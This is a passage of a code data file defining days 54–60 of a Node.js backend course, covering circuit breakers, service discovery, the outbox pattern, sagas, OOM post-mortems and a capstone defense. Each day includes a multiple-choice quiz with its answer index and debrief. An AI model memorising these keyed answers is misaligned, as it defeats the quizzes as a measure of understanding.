    spokenGoal: "Master resilience engineering and Chaos Engineering in Node.js: Learn how to inject failure modes (event loop lag, socket latency, network partition drops, database connection timeouts) in pre-production, and implement the Circuit Breaker pattern (Closed -> Open -> Half-Open) to prevent cascading microservice failures.",
    conceptInvariant: "When a downstream microservice fails or slows down, upstream callers must NOT keep hammering it with requests. A Circuit Breaker trips to `OPEN` state after repeated failures, immediately fast-failing subsequent calls with fallback responses without waiting for network timeouts. After a cooldown, it enters `HALF-OPEN` to test recovery.",
    failureMode: "Failing to implement circuit breakers on external payment gateways: when the gateway experiences a 10-second latency spike, all incoming checkout requests block for 10 seconds, exhausting upstream connection pools and taking down the ENTIRE application.",
    tryItFriction: "Implement a Circuit Breaker in pure TypeScript: trip the breaker after 5 consecutive failures, verify that calls 6–10 fail instantly in 0ms with fallback data, and test automatic recovery on success in Half-Open state.",
    socraticHints: [
      "Why did an outage in our non-essential recommendations service take down the core checkout API?",
      "Cascading Failure! Checkout called recommendations without a circuit breaker or timeout. Every checkout thread hung waiting for recommendations, exhausting all resources.",
      "Wrap non-critical service calls in a Circuit Breaker with a short timeout and instant fallback default."
    ],
    situationalPuzzle: {
      scenario: "During a chaos test, a network partition drops 50% of packets to the Redis cache. The Node.js API response time spikes from 10ms to 5,000ms because requests wait for Redis socket timeouts. What resilience pattern prevents this latency spike?",
      options: [
        "Wait for the network to fix itself.",
        "Circuit Breaker with Fail-Open / Fallback: The circuit breaker trips on Redis timeouts and immediately fails-open, bypassing the cache and querying the primary database (or returning cached defaults) in 5ms without waiting for Redis.",
        "Restart the server.",
        "Double the Redis timeout."
      ],
      answerIdx: 1,
      debrief: "A circuit breaker prevents slow dependencies from degrading the caller. When Redis slows down, the circuit breaker opens and immediately routes requests to alternative fallbacks or bypass paths, isolating the failure and preserving user responsiveness."
    },
    quests: [
      { id: "node-m2-d54-q1", name: "The Circuit Breaker Finite State Machine Topology", type: "concept", desc: "Map states: CLOSED (normal operations) -> OPEN (fast-fail, cooldown timer) -> HALF-OPEN (trial requests -> recovery/trip)." },
      { id: "node-m2-d54-q2", name: "Detective Lab: The Cascading Timeout Microservice Collapse", type: "detective", desc: "Isolate a cascade where a slow third-party currency converter exhausted all HTTP connection pools across the cluster." },
      { id: "node-m2-d54-q3", name: "Mastery Assignment: Production Circuit Breaker with Cockatiel / Opossum", type: "assignment", desc: "Build a resilient RPC client wrapper with circuit breaking, exponential retry backoff, and fallback telemetry." },
      { id: "node-m2-d54-q4", name: "Production Incident Lab: Chaos Engineering Injection in CI Pipelines", type: "detective", desc: "Deploy automated chaos tests simulating packet drop and latency injection using Toxiproxy in integration test suites." }
    ]
  },
  {
    day: 55,
    month: 2,
    blockNum: 11,
    title: "Milestone 10: Autonomous Resilience Engine with Circuit Breakers & Prometheus Exporters",
    stageName: "Stage 2: Guided System Construction",
    stageNum: 2,
    pedagogicalRole: "Milestone Gate (Production Observability & Resilience)",
    spokenGoal: "Build and defend Milestone 10: An autonomous microservice resilience engine integrating OpenTelemetry distributed tracing, Prometheus p99 metric alerts, circuit breakers with automated failover, and structured Pino logging with correlation ID propagation.",
    conceptInvariant: "Enterprise microservices must be self-monitoring and self-healing: automatically isolating failing dependencies via circuit breakers, emitting real-time telemetry to Prometheus and Jaeger, and maintaining sub-50ms response times even during downstream outages.",
    failureMode: "Allowing an upstream circuit breaker to remain OPEN indefinitely after a downstream service has recovered, permanently cutting off functionality.",
    tryItFriction: "Subject your microservice to a simulated 100% downstream outage: prove that the circuit breaker trips within 5 requests, latency drops back to sub-10ms via fallback responses, and the breaker automatically closes when the dependency recovers.",
    socraticHints: [
      "How does the Circuit Breaker know the downstream service has recovered?",
      "After a cooldown duration (e.g. 10s), the breaker transitions to `HALF-OPEN` and lets a small trial percentage of requests through.",
      "If the trial requests succeed, the breaker automatically transitions back to `CLOSED` and restores full traffic."
    ],
    situationalPuzzle: {
      scenario: "During the Milestone 10 defense, the evaluator kills the primary PostgreSQL database container. Your resilience engine detects the failure. What must your API return to incoming read requests?",
      options: [
        "Uncaught Error 500.",
        "Graceful Fallback Response: The circuit breaker intercepts the database failure and serves cached data from Redis with a `X-Data-Source: stale-cache` header, keeping the service 100% operational for reads during the database outage.",
        "Crash the process.",
        "Hang indefinitely."
      ],
      answerIdx: 1,
      debrief: "A resilient architecture provides graceful degradation. When primary persistence fails, circuit breakers and caching layers serve stale read data with degradation headers, maintaining uptime and user experience while databases recover."
    },
    quests: [
      { id: "node-m2-d55-q1", name: "Milestone 10 Resilience & Observability Architecture", type: "concept", desc: "Design the end-to-end telemetry architecture: OpenTelemetry tracer, Prometheus metrics, circuit breakers, and logging." },
      { id: "node-m2-d55-q2", name: "Detective Lab: The Circuit Breaker Half-Open Flapping Glitch", type: "detective", desc: "Fix an unstable breaker that oscillated wildly between Open and Closed due to overly aggressive failure thresholds." },
      { id: "node-m2-d55-q3", name: "Mastery Assignment: Autonomous Resilience & Telemetry Engine", type: "assignment", desc: "Deliver the production resilience engine with Prometheus exporter, OTel tracing, circuit breakers, and health probes." },
      { id: "node-m2-d55-q4", name: "Milestone 10 Defense: Observability & Chaos Engineering Viva", type: "detective", desc: "Defend your circuit breaker thresholds, trace propagation headers, and SLO error budgets before Senior Staff." }
    ]
  },

  // ── BLOCK 12: Distributed Microservices Architecture & Master Capstone (Days 56–60)
  {
    day: 56,
    month: 2,
    blockNum: 12,
    title: "Microservice Service Discovery: Consul, etcd & Client-Side Load Balancing",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Service Discovery & Dynamic Topologies)",
    spokenGoal: "Master dynamic service discovery in distributed systems: Learn how microservices register their dynamic IP addresses and ports with service registries (Consul, etcd, ZooKeeper), perform health checks, and implement client-side load balancing algorithms (Round-Robin, Least Connections, Random with Two Choices).",
    conceptInvariant: "In containerized environments (Kubernetes, AWS ECS), pod IP addresses are ephemeral and change constantly. Hardcoding IP addresses or DNS endpoints creates stale routing. Service Discovery maintains a live registry of healthy service instances, enabling clients to route traffic dynamically.",
    failureMode: "Hardcoding internal IP addresses in environment variables: when a container restarts on a new node with a new IP, all microservices fail to connect, causing an immediate distributed outage.",
    tryItFriction: "Build a client-side load balancer in TypeScript: maintain an active registry of 3 service instances, query health probes, and distribute 1,000 requests using the 'Power of Two Choices' load-balancing algorithm.",
    socraticHints: [
      "What is the 'Power of Two Random Choices' load balancing algorithm?",
      "Instead of pure random or round-robin, pick TWO random instances from the healthy pool, check their active connection counts, and send the request to the one with FEWER connections!",
      "Mathematically, this achieves near-optimal load distribution with minimal coordination overhead."
    ],
    situationalPuzzle: {
      scenario: "A microservice crashes and stops responding to traffic. The service registry health check runs every 10 seconds. For the 10 seconds before the registry detects the crash, incoming requests routed to the dead instance fail. How do smart client-side load balancers eliminate these failures?",
      options: [
        "Run health checks every 10 milliseconds.",
        "Local Circuit Breaking & Retries: The client-side load balancer detects the connection failure immediately on the first attempt, marks that specific instance as locally unhealthy for a cooldown period, and immediately retries the request against another healthy instance.",
        "Crash the client.",
        "Ask the user to refresh."
      ],
      answerIdx: 1,
      debrief: "Smart client-side load balancers combine global service discovery with local health tracking. If a request fails against an instance, the client marks it locally dead, evicts it from the active rotation, and transparently retries against another instance."
    },
    quests: [
      { id: "node-m2-d56-q1", name: "The Service Registry Heartbeat & Gossip Protocol Topology", type: "concept", desc: "Trace service registration, TTL heartbeats, Serf gossip protocols, and dynamic catalog discovery in Consul/etcd." },
      { id: "node-m2-d56-q2", name: "Detective Lab: The Stale IP Address Container Deployment Outage", type: "detective", desc: "Isolate an outage where a service cached DNS lookups forever in Node.js, failing to detect rescheduled container IPs." },
      { id: "node-m2-d56-q3", name: "Mastery Assignment: Client-Side Load Balancer with Dynamic Health Tracking", type: "assignment", desc: "Build an HTTP/gRPC client load balancer implementing Round-Robin, Least-Connections, and auto-eviction." },
      { id: "node-m2-d56-q4", name: "Staff Interview Lab: Client-Side vs Server-Side (Reverse Proxy) Load Balancing", type: "detective", desc: "Evaluate trade-offs between client-side routing (zero proxy hop) versus server-side reverse proxies (NGINX/Envoy)." }
    ]
  },
  {
    day: 57,
    month: 2,
    blockNum: 12,
    title: "Outbox Pattern & Eventual Consistency: Transactional Outbox, Debezium & Change Data Capture (CDC)",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Transactional Outbox & Eventual Consistency)",
    spokenGoal: "Master distributed data consistency: Understand why writing to a database and publishing to Kafka/RabbitMQ in the same route handler causes Dual-Write Data Loss, and master the Transactional Outbox Pattern and Change Data Capture (CDC) with Debezium.",
    conceptInvariant: "The Dual-Write Problem: You cannot atomically commit a database transaction AND publish a message to a message broker in a single operation. If the database commits but the network fails before publishing, data is desynchronized. The Transactional Outbox writes the message into an `outbox` table in the SAME database transaction, guaranteeing 100% consistency.",
    failureMode: "Writing `await db.orders.create(order); await kafka.send('order-created', order)`: if the process crashes or Kafka is down after the DB write, the order exists in the DB but is NEVER sent to the warehouse or payment service.",
    tryItFriction: "Implement the Transactional Outbox pattern: write an order and an outbox event record in a single database transaction, and build a background polling relay that publishes outbox records to a message broker and marks them processed.",
    socraticHints: [
      "Why is writing to a database and publishing to Kafka in the same function a bug?",
      "It is a Distributed Transaction! If one succeeds and the other fails, your system enters an inconsistent corrupted state.",
      "Write both the order AND the message into the SAME database inside `BEGIN ... COMMIT`. Then let a background worker publish it."
    ],
    situationalPuzzle: {
      scenario: "An enterprise candidate is asked: 'Why is Change Data Capture (CDC) via Debezium superior to polling the outbox table with a `SELECT * FROM outbox WHERE processed = false` loop?'",
      options: [
        "Because Debezium is written in Java.",
        "Zero Database Polling Overhead: Debezium reads directly from the PostgreSQL Write-Ahead Log (WAL) replication stream. It captures committed changes in real-time with sub-millisecond latency without executing any polling SQL queries against database tables.",
        "CDC eliminates the database.",
        "Polling is not allowed in SQL."
      ],
      answerIdx: 1,
      debrief: "Polling outbox tables requires continuous SQL queries that create index contention, table bloat, and database CPU load. Change Data Capture (CDC) reads directly from the database's internal transaction log (Postgres WAL), delivering near-instant streaming with zero query overhead."
    },
    quests: [
      { id: "node-m2-d57-q1", name: "The Dual-Write Problem & Transactional Outbox Specification", type: "concept", desc: "Deconstruct the dual-write race condition and prove how local database ACID transactions eliminate message loss." },
      { id: "node-m2-d57-q2", name: "Detective Lab: The Lost Payment Event Dual-Write Outage", type: "detective", desc: "Trace an enterprise outage where network timeouts during Kafka publishing caused unfulfilled paid orders." },
      { id: "node-m2-d57-q3", name: "Mastery Assignment: Transactional Outbox Engine with Postgres WAL Replication", type: "assignment", desc: "Build an Outbox event publisher using PostgreSQL logical replication streams and idempotent message delivery." },
      { id: "node-m2-d57-q4", name: "Staff Interview Lab: Eventual Consistency vs Strong Consistency (CAP Theorem)", type: "detective", desc: "Defend trade-offs between CP systems (strong consistency, lower availability) and AP systems (eventual consistency)." }
    ]
  },
  {
    day: 58,
    month: 2,
    blockNum: 12,
    title: "Distributed Sagas: Orchestration vs Choreography for Multi-Service Transactions",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Distributed Sagas & Compensating Transactions)",
    spokenGoal: "Master distributed business transactions with the Saga Pattern: Learn how to manage multi-service workflows (e.g. Order -> Payment -> Inventory -> Shipping) without 2-Phase Commit (2PC), contrast Orchestrated vs Choreographed Sagas, and implement Compensating Transactions for automated rollbacks.",
    conceptInvariant: "In microservices, transactions cannot span service boundaries. A Saga is a sequence of local transactions. Each transaction updates data in a single service; if a step fails (e.g. payment declined), the Saga executes a sequence of COMPENSATING TRANSACTIONS in reverse order (e.g. release inventory, cancel order) to restore business consistency.",
    failureMode: "Failing to implement compensating transactions: when a flight booking succeeds but hotel booking fails, the user is charged for the flight with no hotel and no refund, creating severe customer support escalation.",
    tryItFriction: "Build an Orchestrated Saga State Machine in pure TypeScript: coordinate Order Creation, Payment Processing, and Inventory Reservation; inject a payment failure, and verify that the orchestrator executes the compensating inventory release.",
    socraticHints: [
      "What is a 'Compensating Transaction' in a Saga?",
      "It is a business undo operation! If you charged a credit card, the compensating transaction is issuing a refund. If you reserved a seat, the compensating transaction is unreserving it.",
      "Every step in a Saga MUST have a corresponding compensating transaction to handle rollbacks."
    ],
    situationalPuzzle: {
      scenario: "A microservices architect must choose between Choreographed Sagas (services emit events and listen to each other) vs Orchestrated Sagas (a centralized Orchestrator coordinates each step). For a complex workflow with 8 steps, multiple branches, and complex rollbacks, which architecture prevents cyclical dependency chaos?",
      options: [
        "Choreography, because it has no orchestrator.",
        "Orchestrated Saga: A central Saga Orchestrator maintains state, explicit workflow definitions, and clear rollback logic. In complex workflows, choreography degenerates into cyclic event spaghetti where tracking state is nearly impossible.",
        "2-Phase Commit over HTTP.",
        "Store all data in one table."
      ],
      answerIdx: 1,
      debrief: "Choreography is clean for simple 2-step workflows. As workflows grow to 5+ steps, choreography creates distributed event spaghetti where no single service understands the full workflow state. Orchestrated Sagas centralize state, making complex flows and compensations clear."
    },
    quests: [
      { id: "node-m2-d58-q1", name: "The Saga Pattern Architecture: Choreography vs Orchestration", type: "concept", desc: "Compare event-driven choreography versus centralized state machine orchestrators (Temporal / Step Functions)." },
      { id: "node-m2-d58-q2", name: "Detective Lab: The Uncompensated Partial Booking Disaster", type: "detective", desc: "Isolate a booking service failure where hotel reservation failures left orphaned non-refundable flight bookings." },
      { id: "node-m2-d58-q3", name: "Mastery Assignment: Production Saga Orchestration State Machine Engine", type: "assignment", desc: "Build an enterprise Saga Orchestrator with persistent state tracking, step retries, and automated compensations." },
      { id: "node-m2-d58-q4", name: "Staff Interview Lab: Why 2-Phase Commit (2PC) Fails at High Scale", type: "detective", desc: "Explain why blocking 2PC coordinators introduce catastrophic latency and availability bottlenecks in cloud distributed systems." }
    ]
  },
  {
    day: 59,
    month: 2,
    blockNum: 12,
    title: "Production Incident Post-Mortem: Dissecting 3 AM Catastrophic Event Loop Lockups & Memory Leaks",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Incident Post-Mortems & Production Debugging)",
    spokenGoal: "Master senior incident response and root-cause analysis (RCA): Conduct a realistic 3 AM production post-mortem, analyze core dumps (`llnode`), decipher Linux kernel Out-Of-Memory (OOM) killer terminations (`dmesg`), and author a blameless post-mortem report.",
    conceptInvariant: "When Linux kills a Node.js process with `Exit Code 137` (SIGKILL / 128 + 9), it was terminated by the Linux Kernel OOM Killer. The application itself didn't crash; the OS ran out of physical memory and selected the largest memory-consuming process to kill. Diagnosing this requires inspecting `dmesg` logs.",
    failureMode: "Restarting a crashed server without capturing heap dumps or core dumps: the evidence is permanently destroyed, guaranteeing that the exact same memory leak or deadlock will strike again on the next traffic spike.",
    tryItFriction: "Analyze a simulated production core dump: inspect memory graphs, identify a runaway closure memory leak that caused an Exit Code 137 termination, and write a blameless engineering post-mortem.",
    socraticHints: [
      "What does exit code 137 mean in Docker/Kubernetes?",
      "137 = 128 + 9 (SIGKILL)! The process did not exit voluntarily. It was forcibly killed by the host OS kernel's Out-Of-Memory (OOM) killer because it exceeded its container memory limit.",
      "Check `dmesg -T` on the host to see the exact kernel OOM kill log and memory footprint."
    ],
    situationalPuzzle: {
      scenario: "At 3:15 AM on a Saturday, an enterprise banking API stops responding. Kubernetes reports all pods in `CrashLoopBackOff`. Node.js logs end abruptly with zero error messages. The engineer checks `kubectl describe pod` and sees: `Last State: Terminated, Reason: OOMKilled, Exit Code: 137`. What was the immediate cause?",
      options: [
        "A syntax error in JavaScript.",
        "The Node.js process exceeded its container memory limit (e.g. 1GB). The Linux kernel immediately sent SIGKILL (signal 9) to protect the host OS, preventing Node from running any error handlers or logging shutdown text.",
        "The database dropped the connection.",
        "A hacker deleted the pod."
      ],
      answerIdx: 1,
      debrief: "OOMKilled with exit code 137 is an uncatchable kernel SIGKILL. The process cannot catch signal 9; it is killed instantly. This is why no error logs appear in Node.js. Root cause analysis requires examining memory heap allocations prior to the kill."
    },
    quests: [
      { id: "node-m2-d59-q1", name: "The Anatomy of a Blameless Engineering Post-Mortem", type: "concept", desc: "Structure an enterprise post-mortem: Incident Summary, Timeline, Root Cause Analysis (5 Whys), Impact, and Action Items." },
      { id: "node-m2-d59-q2", name: "Detective Lab: Dissecting an Exit Code 137 Kernel OOM Killer Termination", type: "detective", desc: "Analyze a production crash where an unbounded streaming buffer exceeded container memory limits." },
      { id: "node-m2-d59-q3", name: "Mastery Assignment: Automated Core Dump & Diagnostic Snapshot Pipeline", type: "assignment", desc: "Configure `--abort-on-uncaught-exception` and Linux coredump generation for post-mortem forensics." },
      { id: "node-m2-d59-q4", name: "Staff Interview Lab: Incident Command & Operational Triage Playbooks", type: "detective", desc: "Establish on-call escalation protocols, mitigation-first triage priorities, and customer communication channels." }
    ]
  },
  {
    day: 60,
    month: 2,
    blockNum: 12,
    title: "Month 2 Master Capstone Viva Gate: HyperStream Distributed Real-Time Event Broker Live Defense",
    stageName: "Stage 3: Enterprise Capstone Defense",
    stageNum: 3,
    pedagogicalRole: "Month 2 Master Capstone Viva (Staff Systems Engineering Defense)",
    spokenGoal: "Defend your Month 2 Master Capstone before the Senior Staff Architect Review Board: `HyperStream` — an enterprise high-throughput distributed event broker ingesting 50,000 events/sec, streaming through backpressure-guarded pipelines, persisting to PostgreSQL with connection pooling, cached via Redis Streams with XFetch, processed by multi-core WorkerPools with Atomics, traced via OpenTelemetry, and resilient against chaotic node failures.",
    conceptInvariant: "Staff-level backend systems engineering requires complete mastery across the entire vertical stack: from V8 heap mechanics and libuv event loop scheduling, to zero-copy binary streaming, lock-free multi-threaded shared memory, and distributed eventual consistency across fault-tolerant microservice meshes.",
    failureMode: "Failing the live architectural viva by being unable to explain how V8 garbage collection generational spaces operate, why backpressure is mandatory in streaming, or how to resolve distributed transaction failures without 2PC.",
    tryItFriction: "Demonstrate live systems defense: ingest 50,000 events/sec under simulated 20% network packet drop, prove sub-20ms p99 latency on active telemetry dashboards, execute a zero-downtime rolling worker restart, and defend your architectural choices against deep probing by Senior Staff.",
    socraticHints: [
      "How would you explain the difference between process clustering and worker threads to an engineering VP?",
      "Clustering forks independent OS processes (memory isolation, fault containment, scales across CPU cores).",
      "Worker Threads run within the SAME process (lightweight, can share physical memory via SharedArrayBuffer, ideal for heavy parallel compute)."
    ],
    situationalPuzzle: {
      scenario: "During the Master Capstone Viva, the VP of Infrastructure asks: 'Your broker ingests 50,000 events per second. Why did you use Node.js with Worker Threads instead of rewriting the entire system in Go or Rust?' How do you defend your architectural choice?",
      options: [
        "Because JavaScript is easier to write.",
        "Architectural Trade-Off Justification: Node.js delivers exceptional single-threaded event-driven network I/O efficiency with vast npm ecosystem velocity. Offloading heavy CPU hashing to Worker Threads and C++ addons allows Node.js to achieve near-native throughput while maintaining rapid product development cycles and unified TypeScript types across frontend and backend.",
        "Go and Rust are too fast.",
        "You didn't know how to write Go."
      ],
      answerIdx: 1,
      debrief: "A Staff Engineer defends technology choices through systems-level trade-offs: Node.js handles massive non-blocking network I/O with exceptional developer velocity and type safety. Coupling it with worker threads for CPU bottlenecks gives near-native performance without forfeiting rapid business iteration."
    },
    quests: [
      { id: "node-m2-d60-q1", name: "Master Capstone System Topology & Enterprise Architecture Specification", type: "concept", desc: "Present the complete enterprise blueprint of HyperStream: ingress streams, worker pools, Redis buffers, and PostgreSQL persistence." },
      { id: "node-m2-d60-q2", name: "Detective Lab: Live High-Concurrency Network Partition Simulation", type: "detective", desc: "Diagnose and resolve a simulated network partition and worker crash under live 50,000 events/sec evaluation load." },
      { id: "node-m2-d60-q3", name: "Mastery Assignment: Full HyperStream Production Event Broker Delivery", type: "assignment", desc: "Deliver the production-grade HyperStream platform with 50k events/sec benchmarks, full test suites, and Docker deployment." },
      { id: "node-m2-d60-q4", name: "Month 2 Master Capstone Defense: Senior Staff Architect Board Examination", type: "detective", desc: "Defend your memory models, event loop mechanics, distributed sagas, and disaster recovery playbooks before Senior Staff." }
    ]
  }
];
